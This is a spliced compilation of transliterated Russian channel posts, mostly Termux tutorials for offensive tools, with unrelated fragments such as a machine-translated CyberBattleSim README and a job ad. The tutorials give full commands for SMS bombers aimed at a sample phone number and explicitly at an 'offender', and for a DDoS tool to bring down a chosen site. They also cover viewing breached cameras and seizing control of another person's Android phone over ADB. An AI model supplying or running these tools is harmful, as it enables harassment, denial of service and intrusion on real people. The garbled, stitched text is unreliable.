['I', 'n', 't', 'e', 'r', 'a', 'k', 't', 'i', 'v', 'n', 'y', 'i', ' ', 'r', 'e', 'zh', 'i', 'm'] >>> Rabota v interaktivnom rezhime podoidet dlia bystroi proverki pary strochek koda, odnako dlia napisaniia polnotsennoi programmy luchshe vospol'zovat'sia sposobom 2.

Galileo v Termux  Galileo - eto instrument testirovaniia na pr$nikn$venie s otkrytym iskhodnym kodom dlia veb-prilozhenii, kotoryi pomogaet razrabotchikam i testeram na pr$nikn$venie vyiavliat' i ispol'zovat' u$zvim$sti v svoikh veb-prilozheniiakh.  Ustanovka Obnovliaem pakety:  $ apt update  $ apt upgrade    Ustanavlivaem git:  $ pkg install git -y    Ustanavlivaem python:  $ pkg install python    Ustanavlivaem repozitorii:  $ git clone https://github.com/cclauss/Galileo    Perekhodim v repozitorii:  $ cd Galileo   Ustanovka utility $ pip install -r requirements.txt  $ chmod +x galileo.py  $ python3 galileo.py $ pkg install python-pysocks  $ pacman -S python2-pysocks   Ispol'zovanie  > show modules - smotrim, kakoi modul' budem ispol'zovat'  > use nazvanie_modulia , kotoryi vybrali  > show options - smotrim optsii, kotorymi raspolagaet vybrannyi modul'  > set HOST IP_tseli ,ili URL (zapolniaem trebuemye parametry)  > run - zapusk vybrannogo modulia  ---------------------------------------- Nashi proekty:  YouTube: vk.cc/bWMyTS  VK: vk.cc/bWMyVZ  Telegram: vk.cc/bWMyWY  ---------------------------------------- Chaty nashego proekta:  VK: vk.cc/bWMyYz  Telegram: vk.cc/bWMz0h  ---------------------------------------- Igrovaia zona i ne tol'ko:  Discord: vk.cc/bX5nij  ----------------------------------------

Vse interpretiruemye iazyki medlennye. No my znaem, chto Java tozhe iazyk takogo tipa, eio baitkod interpretiruetsia JVM. Kak pokazano, v etom benchmarke, Java namnogo bystree, chem Python.

#sliv_termux   Vam skuchno v gostiakh i vy khotite kogo-to vpechatlit' svoimi "khakerskimi" umeniiami? I tak, pronikaem vo vzlomannye kamery cherez Termux    V nashe vremia kamery videonabliudeniia ustanovleny absoliutno povsiudu. I khotia nekotorye iz nikh zashchishcheny deistvitel'no neplokho, bol'shaia chast' voobshche lishena kakoi-libo zashchity. I proiskhodit takoe potomu, chto sam chelovek podkhodit k zashchite svoikh ustroistv neser'ezno, i kamery tut - ne iskliuchenie.    K chemu vse eto? Delo v tom, chto entuziasty sobiraiut i publikuiut v raznye utility tselye bazy so vzlomannymi kamerami. Odna iz takikh nazyvaetsia Cam-Hackers, imenno s nei my segodnia i budem rabotat'.     Ustanovka:    $ apt update & apt upgrade  $ pip2 install requests  $ git clone https://github.com/AngelSecurityTeam/Cam-Hackers  $ cd Cam-Hackers  $ python3 cam-hackers.py     Ispol'zovanie:    Posle zapuska u vas otkroetsia meniu s ogromnym kolichestvom stran. Potrebuetsia vybrat' nomer interesuiushchei vas strany. Posle etogo poiaviatsia ssylki na vzlomannye kamery. Gotovo! Teper' gorod pod vashim nabliudeniem

#sliv_termux   Vam nuzhno zaspamit' sms-kami obidchika? K vashemu predstavleniiu moshchnyi sms bomber impulse v Termux    Dannyi bomber imeet bolee 60-ti servisov, iavliaetsia kross-platformennym PO, rabotaet na Linux, Windows, a takzhe v Termux.     Ustanovka:  $ pkg update  $ pkg install python3 python3-pip git -y  $ git clone https://github.com/LimerBoy/Impulse  $ cd Impulse/  $ pip3 install -r requirements.txt  $ python3 impulse.py --help     Primer zapuska:  $ python3 impulse.py --method SMS --time 20 --threads 15 --target +79255554566

Podobnuiu frazu mozhno vstretit' vo mnogikh detektivnykh fil'makh ili trillerakh, gde zashchitniki pravoporiadka pytaiutsia poimat' neulovimogo zlodeia. V epokhu Interneta temi samymi neulovimymi zlodeiami mozhno nazvat' kiberprestupnikov (khakerov), kotorym dlia soversheniia prestuplenii ne trebuetsia pokazyvat' svoego litsa, i dazhe ne obiazatel'no nakhodit'sia v odnoi strane s zhertvoi ataki, a vse ikh deistviia mogut ostat'sia anonimnymi. Chtoby poniat' kak deistvuet zloumyshlennikom, nuzhno samomu stat' im. Odnako, u Ugolovnogo Kodeksa RF na eto drugie vzgliady. V chastnosti, 28 glava UK RF reguliruet prestupleniia v sfere komp'iuternoi informatsii. Kak byt' v etom sluchae spetsialistu po informatsionnoi bezopasnosti, esli narushat' zakonodatel'stvo -- plokhaia ideia, a poniat' kak myslit zloumyshlennik vse zhe neobkhodimo? Na pomoshch' prikhodiat besplatnye ploshchadki testirovaniia na proniknovenie, gde liuboi zhelaiushchii mozhet poprobovat' svoi sily v penteste, prokachat' sobstvennye navyki i ispol'zovat' poluchennye znaniia dlia povysheniia urovnia zashchishchennosti svoei kompanii. Est' 2 tipa ploshchadok:

Vzlom Android-ustroistva s pomoshch'iu ip-adresa.   Etot sposob smozhet pomoch', koda Vam neobkhodimo poluchit' dostup k svoemu ustroistvu, kotoroe nakhoditsia daleko. Nam potrebuetsia Kali Linux.  Ustanovka   apt-get install adb   sudo apt update   sudo apt-get install android-* tools-adb   sudo apt install android-tools-adb android-tools-fastboot   git clone https://github.com/Bafomet666/Satana-Android-Debug-Bridge   cd Satana-Android-Debug-Bridge-main  Zapusk     python3 SatanaADB.py  Otkryv eio, nam otkroetsia meniu. V niom vvodim tsifru "3", posle etogo, vvodim ip-adres, kotoryi Vy dolzhny byli uznat' ranee. (Metodami SI, esli ustroistvo ne Vashe)  Teper' u vas est' vozmozhnost' upravliat' kameroi, vkliuchat' i vykliuchat' Android-ustroistvo, a takzhe, mozhno upravliat' klaviaturoi i t.d.

CyberBattleSim  CyberBattleSim-eto eksperimental'naia issledovatel'skaia platforma dlia issledovaniia vzaimodeistviia avtomatizirovannykh agentov, rabotaiushchikh v modeliruemoi abstraktnoi korporativnoi setevoi srede. Modelirovanie obespechivaet vysokourovnevuiu abstraktsiiu komp'iuternykh setei i kontseptsii kiberbezopasnosti. Ego otkrytyi interfeis AI Gym na osnove Python pozvoliaet obuchat' avtomatizirovannykh agentov s ispol'zovaniem algoritmov obucheniia podkrepleniiu.  Sreda modelirovaniia parametrizuetsia fiksirovannoi topologiei seti i naborom uiazvimostei, kotorye agenty mogut ispol'zovat' dlia bokovogo peremeshcheniia v seti. Tsel' zloumyshlennika-zavladet' chast'iu seti, ispol'zuia uiazvimosti, zalozhennye v komp'iuternykh uzlakh. V to vremia kak zloumyshlennik pytaetsia rasprostranit'sia po vsei seti, agent zashchitnika nabliudaet za setevoi aktivnost'iu i pytaetsia obnaruzhit' liubuiu ataku i smiagchit' vozdeistvie na sistemu, vytesniv zloumyshlennika. My predostavliaem bazovyi stokhasticheskii zashchitnik, kotoryi obnaruzhivaet i smiagchaet tekushchie ataki, osnovannye na zaranee opredelennykh veroiatnostiakh uspekha. My realizuem smiagchenie putem povtornogo otobrazheniia zarazhennykh uzlov-protsess, abstraktno smodelirovannyi kak operatsiia, okhvatyvaiushchaia neskol'ko etapov modelirovaniia.  Chtoby sravnit' proizvoditel'nost' agentov, my rassmotrim dva pokazatelia: kolichestvo shagov modelirovaniia, predpriniatykh dlia dostizheniia ikh tseli, i sovokupnoe voznagrazhdenie za etapy modelirovaniia v raznye periody obucheniia.  Tseli proekta  My rassmatrivaem etot proekt kak eksperimental'nuiu platformu dlia provedeniia issledovanii vzaimodeistviia avtomatizirovannykh agentov v abstraktnykh modeliruemykh setevykh sredakh. Otkryvaia it-resursy, my nadeemsia pobudit' issledovatel'skoe soobshchestvo issledovat', kak kiberagenty vzaimodeistvuiut i razvivaiutsia v takikh setevykh sredakh.  Modelirovanie, kotoroe my predlagaem, po obshchemu priznaniiu, uproshchenno, no eto imeet svoi preimushchestva. Ego kraine abstraktnaia priroda zapreshchaet priamoe primenenie k real'nym sistemam, obespechivaia tem samym zashchitu ot potentsial'nogo gnusnogo ispol'zovaniia avtomatizirovannykh agentov, obuchennykh s ego pomoshch'iu. V to zhe vremia ego prostota pozvoliaet nam sosredotochit'sia na konkretnykh aspektakh bezopasnosti, kotorye my stremimsia izuchit', i bystro eksperimentirovat' s noveishimi algoritmami mashinnogo obucheniia i iskusstvennogo intellekta.  Naprimer, tekushchaia realizatsiia fokusiruetsia na metodakh kiberatak bokovogo dvizheniia s nadezhdoi poniat', kak topologiia i konfiguratsiia seti vliiaiut na nikh. Imeia v vidu etu tsel', my schitali, chto modelirovanie real'nogo setevogo trafika ne iavliaetsia neobkhodimym. Eto vsego lish' odin primer sushchestvennogo ogranicheniia v nashei sisteme, kotoroe, vozmozhno, potrebuetsia ustranit' v budushchem.  S algoritmicheskoi storony, my predostavliaem nekotorye bazovye agenty v kachestve otpravnykh tochek, no nam bylo by liubopytno uznat', kak sovremennye algoritmy obucheniia podkrepleniiu sravnivaiutsia s nimi. My obnaruzhili, chto bol'shoe prostranstvo deistvii, prisushchee liuboi komp'iuternoi sisteme, predstavliaet soboi osobuiu problemu dlia obucheniia s podkrepleniem, v otlichie ot drugikh prilozhenii, takikh kak videoigry ili upravlenie robotami. Obuchenie agentov, kotorye mogut khranit' i izvlekat' uchetnye dannye, iavliaetsia eshche odnoi problemoi, s kotoroi stalkivaiutsia pri primenenii metodov RL, gde agenty obychno ne imeiut vnutrennei pamiati. Eto drugie oblasti issledovanii, gde modelirovanie mozhet byt' ispol'zovano dlia tselei benchmarkinga.  Drugie oblasti, predstavliaiushchie interes, vkliuchaiut otvetstvennoe i etichnoe ispol'zovanie avtonomnykh sistem kiberbezopasnosti: Kak sproektirovat' korporativnuiu set', kotoraia daet vnutrennee preimushchestvo agentam zashchitnikov? Kak provodit' bezopasnye issledovaniia, napravlennye na zashchitu predpriiatii ot avtonomnykh kiberatak i pri etom predotvrashchat' nechestnoe ispol'zovanie takikh tekhnologii?  Dokumentatsiia  Prochtite Kratkoe vvedenie v proekt.  Sostoianie sborki TipVetkaStatusCImasterIzobrazhenie dokeramaster Pokazatel'  Sm .Benchmark.  Nastroika sredy razrabotki  Nastoiatel'no rekomenduetsia rabotat' v srede Linux, libo neposredstvenno, libo cherez WSL v Windows. Zapusk Python neposredstvenno v Windows dolzhen rabotat', no bol'she ne podderzhivaetsia.  Nachnite s proverki repozitoriia: merzavets klon https://github.com/microsoft/CyberBattleSim.git V Linux ili WSL  Instruktsii byli protestirovany na distributive Linux Ubuntu (kak rodnom, tak i cherez WSL). Vypolnite sleduiushchuiu komandu, chtoby nastroit' sredu razrabotki i ustanovit' vse neobkhodimye zavisimosti (pakety apt i pip): ./init.sh Skript ustanavlivaet python3.8, esli ego net. Esli vy ispol'zuete versiiu Ubuntu starshe 20, ona avtomaticheski dobavit dopolnitel'nyi repozitorii apt dlia ustanovki python3.8.  Skript sozdast virtual'nuiu sredu Python pod venvpodkatalogom, s pomoshch'iu kotorogo vy smozhete zapustit' Python venv/bin/python.  Primechanie: Esli vy predpochitaete Python iz global'noi ustanovki vmesto virtual'noi sredy, to vy mozhete propustit' sozdanie virtual'noi sredy, zapustiv skript s ./init.sh -npomoshch'iu . Vmesto etogo vse pakety Python budut ustanovleny v obshchesistemnoi ustanovke Python 3.8.  Podsistema Windows dlia Linux  Podderzhivaemaia sreda razrabotki v Windows osushchestvliaetsia cherez WSL. Snachala vam nuzhno ustanovit' distributiv Ubuntu WSL na svoi komp'iuter s Windows, a zatem pereiti k instruktsiiam Linux (sleduiushchii razdel).  Autentifikatsiia Git iz WSL  Dlia autentifikatsii s pomoshch'iu Git vy mozhete libo ispol'zovat' autentifikatsiiu na osnove SSH, libo ispol'zovat' triuk credential-helper dlia avtomaticheskoi generatsii tokena PAT. Poslednee mozhno sdelat', zapustiv sleduiushchuiu komandu pod WSL (podrobnee zdes'): git config --global credential.helper "/mnt/c/Program Files/Git/mingw64/libexec/git-core/git-credential-manager.exe" Doker na WSL  Chtoby zapustit' sredu v konteinere docker, my rekomenduem zapustit' dockeree cherez podsistemu Windows v Linux (WSL), ispol'zuia sleduiushchie instruktsii: Ustanovka Docker v Windows pod WSL).  Windows (ne podderzhivaetsia)  Etot metod bol'she ne podderzhivaetsia, pozhaluista, predpochitaite vmesto etogo rabotat' v srede WSL podsistemy Linux. No esli vy nastaivaete, chto khotite nachat' s ustanovki Python 3.8, to v komandnoi stroke Powershell zapustite ./init.ps1stsenarii.  Nachalo raboty bystroe ispol'zovanie Docker  Samyi bystryi sposob vstat' i zapustit'-cherez konteiner Docker.  PRIMEChANIE: Po prichinam litsenzirovaniia my ne rasprostraniaem publichno ni odin artefakt sborki. V chastnosti, reestr dockerspinshot.azurecr.io, upomianutyi v privedennykh nizhe komandakh, ostaetsia zakrytym tol'ko dlia soprovozhdaiushchikh proekta.  V kachestve obkhodnogo puti vy mozhete samostoiatel'no vossozdat' obraz docker s pomoshch'iu predostavlennogo Dockerfilefaila, opublikovat' poluchennyi obraz v svoem sobstvennom reestre docker i zamenit' imia reestra v privedennykh nizhe komandakh. vkhod v doker spinshot.azurecr.io tiaga dokera spinshot.azurecr.io/cyberbattle:239bdf22e47aa1c8c88915f356cede002865fa1c docker run -it spinshot.azurecr.io/cyberbattle:239bdf22e47aa1c8c88915f356cede002865fa1c cyberbattle/agents/baseline/run.py Prover'te svoe okruzhenie  Vypolnite sleduiushchuiu komandu dlia zapuska modelirovaniia s bazovym agentom RL: python cyberbattle/agents/baseline/run.py --training_episode_count 1 --eval_episode_count 1 --iteration_count 10 --rewardplot_with 80 --chain_size=20 --ownership_goal 1.0  Esli vse nastroeno pravil'no, vy dolzhny poluchit' vyvod, kotoryi vygliadit sleduiushchim obrazom: fakel CUDA i dostupno=istina ###### DQL po obucheniiu: episode_count=1,iteration_count=10,?=0.9,?_min=0.1, ?_expdecay=5000,?=0.015, to LR=0.01, replaymemory=10000, paketnyi=512, target_update=10 ## epizod: 1/1 'DQL po' ?=0.9000, ?=0.015, to LR=0.01, replaymemory=10000, paketnyi=512, target_update=10 Epizod 1|iteratsiia 10|nagrada: 139.0|istekshee vremia: 0:00:00|###################################################################| ###### Sluchainogo poiska obuchenii s: episode_count=1,iteration_count=10,?=1.0,?_min=0.0, ## epizod: 1/1 'sluchainogo poiska' ?=1.0000, Epizod 1|iteratsiia 10|nagrada: 194.0|Istekshee vremia: 0:00:00|###################################################################| modelirovanie sostava epizod prodolzhitel'nost'-DQN=Krasnyi, Sluchainyi=zelenyi 10.00 + kumuliativnye nagrady-DQN=Krasnyi, sluchainyi=zelenyi 194.00 + ?--? 174.60 + | 155.20 +?-----? 135.80 +| ?--? 116.40 +| | 97.00 +| ?? 77.60 +| | 58.20 +? ?--? 38.80 + | 19.40 + | 0.00 +--? Zapisnye knizhki Iupitera  Chtoby bystro oznakomit'sia s proektom, vy mozhete otkryt' odin iz predostavlennykh bloknotov Juptyer, chtoby igrat' v interaktivnom rezhime s okruzheniem trenazhernogo zala. Prosto zapustite jupyter s jupyter notebookpomoshch'iu ili venv/bin/jupyter notebookesli vy ispol'zuete nastroiku virtual'noi sredy.  "Zakhvat flaga" igrushechnaia sreda bloknoty: Sluchainyi agentInteraktivnaia sessiia dlia cheloveka-igrokaInteraktivnaia sessiia - polnost'iu reshena Bloknoty tsepnoi sredy: Sluchainyi agent Drugie usloviia: Interaktivnaia sessiia so sluchaino sgenerirovannoi sredoiSluchainyi agent, igraiushchii v sluchaino sgenerirovannykh setiakh Sleduiushchie .pyzapisnye knizhki luchshe vsego prosmatrivat' v VSCode ili v Jupyter s rasshireniem Jupytext i pri neobkhodimosti legko konvertirovat' v .ipynbformat:  Benchmarki tsepnykh sred: Benchmark vsekh bazovykh agentovVse bazovye agenty protiv bazovogo zashchitnikaDeepQLEpsilon zhadnyiTablichnoe Q Obuchenie Zakhvat flaga benchmark: DeepQL Kak sozdat' ekzempliar sredy trenazhernogo zala?  Sleduiushchii kod pokazyvaet, kak sozdat' ekzempliar v trenazhernom zale OpenAI srede CyberBattleChain-v0, okruzhaiushchei sredy, osnovannykh na tsep', kak setevye struktury, s 10 uzlov (size=10), gde agentu tsel'-libo poluchit' polnoe pravo sobstvennosti na seti (own_atleast_percent=1.0) ili pereryv na 80% seti, dostupnost' po SLA (maintain_sla=0.80), v to vremia kak seti kontroliruetsia i zashchishchaetsia osnovnykh probalistically modeliruetsia zashchitnik (defender_agent=ScanAndReimageCompromisedMachines): import cyberbattle._env.cyberbattle_env cyberbattlechain_defender = gym.make('CyberBattleChain-v0', size=10, attacker_goal=AttackerGoal( own_atleast=0, own_atleast_percent=1.0 ), defender_constraint=DefenderConstraint( maintain_sla=0.80 ), defender_agent=ScanAndReimageCompromisedMachines( veroiatnost'=0,6, scan_capacity=2, scan_frequency=5)) Chtoby poprobovat' drugie topologii seti, voz'mem primer chainpattern.py chtoby opredelit' svoi sobstvennyi nabor mashin i uiazvimostei, dobav'te zapis' v initsializator modulia dlia ob'iavleniia i registratsii sredy trenazhernogo zala.  Sposobstvuiushchii  Etot proekt privetstvuet vklady i predlozheniia. Bol'shinstvo vkladov trebuiut, chtoby vy soglasilis' s Litsenzionnym soglasheniem uchastnika (CLA), v kotorom govoritsia, chto vy imeete pravo i fakticheski predostavliaete nam prava na ispol'zovanie vashego vklada. Dlia polucheniia bolee podrobnoi informatsii posetite sait <url>. https://cla.opensource.microsoft.com.  Kogda vy otpravliaete zapros na vytiagivanie, CLA-bot avtomaticheski opredeliaet, nuzhno li vam predostavit' CLA i sootvetstvuiushchim obrazom ukrasit' PR (naprimer, proverka statusa, kommentarii). Prosto sleduite instruktsiiam, predostavlennym botom. Vam nuzhno budet sdelat' eto tol'ko odin raz vo vsekh REPO, ispol'zuia nash CLA.  Etot proekt prinial Kodeks povedeniia Microsoft s otkrytym iskhodnym kodom. Dlia polucheniia dopolnitel'noi informatsii sm. Chasto zadavaemye voprosy po Kodeksu povedeniia ili sviazhites' s nami opencode@microsoft.com s liubymi dopolnitel'nymi voprosami ili kommentariiami.  Idei dlia vklada  Vot nekotorye idei o tom, kak vnesti svoi vklad: uluchshit' simuliatsiiu (osnovannuiu na sobytiiakh, usovershenstvovat' simuliatsiiu,...), obuchit' algoritm RL na sushchestvuiushchei simuliatsii, realizovat' benchmark dlia otsenki i sravneniia novizny agentov, dobavit' bol'she setevykh generativnykh rezhimov dlia obucheniia RL-agenta, vnesti svoi vklad v doc, ispravit' oshibki.  Dopolnitel'nye idei sm. takzhe v wiki.  Tsitiruia etot proekt @misc{msft:cyberbattlesim, Author = {Issledovatel'skaia gruppa Microsoft Defender.} Primechanie = {sozdannye Kristian Zaifert, Maikl Betser, Uil'iam Blum, Dzheims Bono, Keit Ferris, Emili Goren, Dzhastin Grana, Kristian Holsheimer, Brendon Marken, Dzhoshua Nil, Nikol' Nikols, skulovoi Parikh, on Vei.}, Izdatel' = {Gitkhabe}, Howpublished = {URL-adresa{https://github.com/microsoft/cyberbattlesim}}, Zvanie = {CyberBattleSim}, God = {2021} }  #mashinnoeobuchenie, #machinelearning, #ML, #kiberbezopasnost'

Instrument dlia provedeniia razlichnykh "flud" atak - Impulse (Linux, Termux)  Vozmozhnosti: 1. Sms bomber 2. Email sms bomber 3. DDoS ataka 4. Syn Flood 5. UDP flood 6. POD "Ping of Death" (DoS) 7. ICMP flood 8. Http Flood 9. Slowloris 10. Memcached  Ustanovka:  git clone https://github.com/LimerBoy/Impulse  cd Impulse/  pip3 install -r requirements.txt  Ispol'zovanie: python3 impulse.py --help  Nam pokazhet vse argumenty dlia ispol'zovaniia. Privedu primer na sms bombere:  python3 impulse.py --method SMS --time 100 --threads 200 --target +380123456789 (Sovetuiu esli uvelichivaete vremia ataki "time"  to "threads" stavit' v dva raza bol'she time)

Entuziasty razrabotali instrument  Cloud-killer, kotoryi pozvoliaet oboiti zashchitu i vychislit' real'nyi adres IP saita.  Ustanovka  apt update && apt upgrade git clone https://github.com/FDX100/cloud-killer.git cd cloud-killer  Zapusk  python3 cloud_killer.py  Esli vse domeny krasnye, znachit sait ne ispol'zuet cloudflare.

Scylla is an OSINT tool developed in Python 3.6. Scylla lets users perform advanced searches on Instagram & Twitter accounts, websites/webservers, phone numbers, and names. Scylla also allows users to find all social media profiles (main platforms) assigned to a certain username. In continuation, Scylla has shodan support so you can search for devices all over the internet, it also has in-depth geolocation capabilities. Lastly, Scylla has a finance section which allows users to check if a credit/debit card number has been leaked/pasted in a breach and returns information on the cards IIN/BIN. This is the first version of the tool so please contact the developer if you want to help contribute and add more to Scylla.Installation1: git clone https://www.github.com/DoubleThreatSecurity/Scylla2: cd Scylla3: sudo python3 -m pip install -r requirments.txt4: python3 scylla.py --help  Usage    python3 scylla.py --instagram davesmith --twitter davesmithCommand 1 will return account information of that specified Instagram & Twitter account... #gathering #informationgathering #osint #phonenumber #python #python3 #schiavone #scylla

Kazhdyi veb-razrabotchik, da i mnogie pol'zovateli rano ili pozdno stalkivaiutsia s Internet Archive i neobkhodimost'iu sokhranit' ili vosstanovit' vid vazhnogo im saita v opredelionnoe vremia. S kazhdym godom vsio ochevidnee, chto pogovorka <<internet pomnit vsio>> oshibochna -- forumy zakryvaiutsia, starye saity tikho ischezaiut, informatsiia propadaet bez sleda (vot khoroshaia stat'ia po teme). Pri etom poka ne sushchestvuet obshchepriniatogo sposoba na letu sokhraniat' vazhnyi kontent bez lishnikh telodvizhenii (predstav'te, chto budet s serverami archive.org, esli, skazhem, v sleduiushchem obnovlenii Chrome budet pri zagruzke stranitsy otpravliat' adres na arkhivatsiiu). Spasenie utopaiushchikh -- delo ruk samikh utopaiushchikh, poetomu v etoi stat'e my razberiom instrument, pozvoliaiushchii ne prosto sokhraniat' nuzhnye saity, no i vstraivat' etot protsess v povsednevnuiu rabotu.

!! Data Scientist v fintech Kompaniia DigiU - eto ekosistema razrabotki i finansirovaniia proektov v sfere iskusstvennogo intellekta i blokchein-tekhnologii. Nash otdel spetsializiruemsia na algoritmicheskom treidinge na kriptovaliutnykh birzhakh, R&D laboratoriia razrabatyvaet algoritm prediktivnoi analitiki raboty fondovoi birzhi s ispol'zovaniem neironnykh setei. My ishchem v komandu liudei gotovykh vmeste s nami reshat' slozhnye interesnye zadachi po mashinnomu obucheniiu. V rabote privetstvuem initsiativu i predostavliaem svobodu v vybore metodov i podkhodov k realizatsii. Otlichnaia vozmozhnost' dlia tekh, kto liubit eksperimentirovat' i khochet rasshirit' svoi znaniia i navyki. Zadachi:   sozdanie i obuchenie modelei dlia predskazaniia dvizheniia tsen osnovyvaias' na istoricheskikh dannykh i dannykh blokcheina;   testirovanie obuchennykh modelei;   podgotovka dannykh dlia trenirovki modelei;   primenenie modelei v real'nom mire.     Trebovaniia:     khoroshee znanie Python3;   opyt sozdaniia i raboty s glubokimi setkami;   opyt raboty kak minimum s odnim iz osnovnykh freimvorkov dlia gluboko obucheniia (PyTorch, TensorFlow, MXNet, i t.d.);   uverennoe znanie angliiskogo iazyka i tekhnicheskoi terminologii;   khoroshee znanie matematiki: statistiki i lineinoi algebry;   opyt raboty na Linux i ispol'zovaniia git.     Usloviia:    komfortnyi ofis po linii metro (st. <<Oktiabr'skaia>>), v Akademgorodke, Sochi; vozmozhnost' rabotat' udalenno, khot' na drugom kontinente; belaia zarabotnaia plata; uchastie v konferentsiiakh, vebinarakh i drugikh professional'nykh meropriiatiiakh; korporativnyi angliiskii; vnutrenniaia sistema professional'nogo razvitiia; legkaia, druzhestvennaia atmosfera, pliushki v ofise, veselye korporativy; DMS (s vkliuchennym analizom na SARS-CoV-2 + KT); vozmozhnost' vliiat' na razvitie produktov kompanii. I am trying to implement iterative pruning algorithm (as described in the research papers in[1], [2]) which is: train a model, prune p% of smallest weights per layer, re-train the pruned model and repeat. For experiment purposes, I am using LeNet-300-100 neural network on MNIST.

Napominalka po nastroike servera dlia razrabotki WEB prilozhenii  Nastraivaem SSH:   sudo apt install ssh   sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.copy   sudo nano /etc/ssh/sshd_config   sudo service sshd restart   sudo systemctl restart sshd    Perezagruzhaem server   sudo shutdown -r   dpkg -l|grep "ssh*"   sudo apt install htop   sudo apt install mc   sudo apt install tmux   sudo apt install lynx   sudo apt install gcc   sudo apt install make    Ustanavlivaem biblioteki:   sudo apt install zlibc zlib1g-dev python3-pip python3-dev postgresql postgresql-contrib libsqlite3-dev build-essential libssl-dev zlib1g-dev zlibbz2- dev wget curl xz-utils tk-dev     sudo apt update   sudo apt upgrade    Skachivaem arkhiv pitona raspakovyvaem i perekhodim v papku:   tar -zxvf Python-3.9.1.tgz   cd Python-3.9.1  #python #tmux #linux #programmirovanie

OSINT tool to get information from a github profile and find GitHub user's email addresses leaked on commits.How does this work?  GitHub uses the email address associated with a GitHub account to link commits and other activity to a GitHub profile. When a user makes commits to public repos their email address is usually published in the commit and becomes publicly accessible, if you know where to look.  GitHub provide some instructions on how to prevent this from happening, but it seems that most GitHub users either don't know or don't care that their email address may be exposed.  Finding a GitHub user's email address is often as simple as looking at their recent events via the GitHub API.    Idea and text from Nick Drewe.      Source: https://thedatapack.com/tools/find-github-user-email/ Prerequisites   Installation  git clone https://github.com/GONZOsint/gitrecon.gitcd gitrecon/python3 -m pip install -r requirements.txt  It is possible to use a Github access token by editing line 23 of the gitrecon... #accesstoken #commandline #emails #github #gitrecon #leaked

Ustanovka sms bombera b0mb3r na termux (po SNG dolzhno rabotat', eto chto-to tipa analoga bombera na python)     1. Proverit' obnovlenie komandoi apt update -y && apt upgrade -y  2. Ustanovit' komandoi apt install git wget nano python python2 python3 perl clang libxslt zsh -y  3. Ustanovit' bombera komandoi git clone https://github.com/Denishnc/b0mb3r  4. Zaiti v papku skachennuiu cd b0mb3r  5. Vstavit' takuiu komandu dlia ustanovki python -m pip install -r requirements.txt  6. Zapustit' komandoi python main.py  7. Skopiruite ssylku i vstavte v brauzer kotoraia budet napisano u vas ( U menia http://192.168.100.3:8080/ ) U vas mozhet byt' drugaia.  8. Vvedite nomer v okoshke nomer, vvedite skol'ko raz i tekst ( Inogda tekst ne rabotaet ) I postav'te galochku zvonki ( Inogda tozhe ne rabotaet )  9. Nazhmite knopku nachat' ataku ( Chto by zavershit' prosto vykliuchite termuks )    Ustanovka sms bobmer android    1. Proverit' obnovlenie komandoi apt update -y && apt upgrade -y  2. (Esli delali ranee to ne nuzhno delat' ) ustanovit' komandoi apt install git wget nano python python2 python3 perl clang libxslt zsh -y  3. Ustanovit' bombera komandoi git clone https://github.com/Argisht44/android.git  4. Vvodim komandu cd  5. Vidim papku android pishem cd android chto by voiti v neio  6. Vidim spisok papok nakhodim pod vashu operatsionnuiu sistemu ( U menia eto papka Infinite-Bomber-arm64-without-tor) Vy tozhe mozhete poprobovat' eio vvesti.  7. Vvodim komandu vashei razriadnosti po defoltu eto cd Infinite-Bomber-arm64  8. Daem prava failu komandoi chmod 777 infinite-bomber  9. Pishem komandu ./infinite-bomber  10. Bomber zapustilsia, vvodim nomer (Bez +)  11. Nazhimaem 1 (Tol'ko sms)  12. Nazhimaem 1 ( Chto by videt' skol'ko sms prishlo )  13. Zhmem 0 ( Beskonechno )  Ostanovit' bomber mozhno komandoi CTRL C ili vykliuchite termuks

DDoS ataka na sait (termux)  Nachalo  Shag 1  Chtoby ustanovit' nuzhnye nam ulity my ustanovil programmu, kotoraia avtomaticheski ikh ustanavlivaet, razumeetsia ne vse a te kotorye my vyberem. Opisana ulity nazyvaetsia temnym nazvaniem DarkFly Shag 2  Dlia nachala propisyvaem privychnye nam komandy :  apt update apt upgrade  Sleduiushchim deistviem budet ustanovka osnovnykh iazykov na kotorom rabotaet Termux.Eto python i python2. Obiazatel'no vo vremia ustanovki so vsem soglashaemsia, a to nichego ne poluchit'sia!  apt install python apt install python2 Sleduiushchim deistviem nuzhno razreshit' ustanovku dop paketov. Esli vy eto uzhe delali to delat' eto ne obiazatel'no. Rekomenduiu vam pochitat' pro osnovnye komandy, ustanavlivaiushchie vazhnye dop. ulity dlia bolee udobnogo ispol'zovaniia!  apt install git apt install php Dalee my ustanavlivaem sami pakety DarkFly  git clone https://github.com/Ranginang67/DarkFly-Tool Otkryvaem papku s ustanovlennoi ulitoi.  cd DarkFly-Tool Predostavliaet vse razresheniia  chmod +x install.py python2 install.py Zapuskaem komandu!  DarkFly ddosAtaka na sait s pomoshch'iu Termux Sleduiushchii raz vam ne pridetsia vypolniat' eti deistviia! Mozhete prosto vvodit' DarkFly i vse!  Shag 3  Ustanovka ulit  Chtoby ustanovit' kakuiu libo ulitu nuzhno :  V pisat' v vybore punkta tsifru 1. ddosAtaka na sait s pomoshch'iu Termux Vvodim nomer 16 ddosAtaka na sait s pomoshch'iu Termux Tak my ustanavlivaet prosteishii DDOS .S ego pomoshch'iu my smozhem polozhit' kakoi libo sait.  Shag 4  Proverka ulity.  Ia ne poluchaiu vas k kakim libo deistviiam i pishu etot material tol'ko v oznakomitel'nykh tseliakh. Ia ne nesu otvetstvennost' za sovershennye vami deistviia!  Dlia nachala nam nuzhno vyiti iz DarkFly. I vvesti apt update i perezapustit' Termux apt update Dalee vvesti ls cd hammer python hammer.py Vot chto dolzhno poluchit'sia!  Vot chto dolzhno poluchit'sia! Vybiraem sait dlia DDOS, kopiruem IP adresa etogo saita i vvodim : python3 hammer.py [-s] [-p] [-t)     -s : server ip     -p : port default 80     -t : turbo default 135 I zhdem obnovliaiu sait cherez nekotoroe vremia vyskochit oshibka.  Vot i nastupil konets....

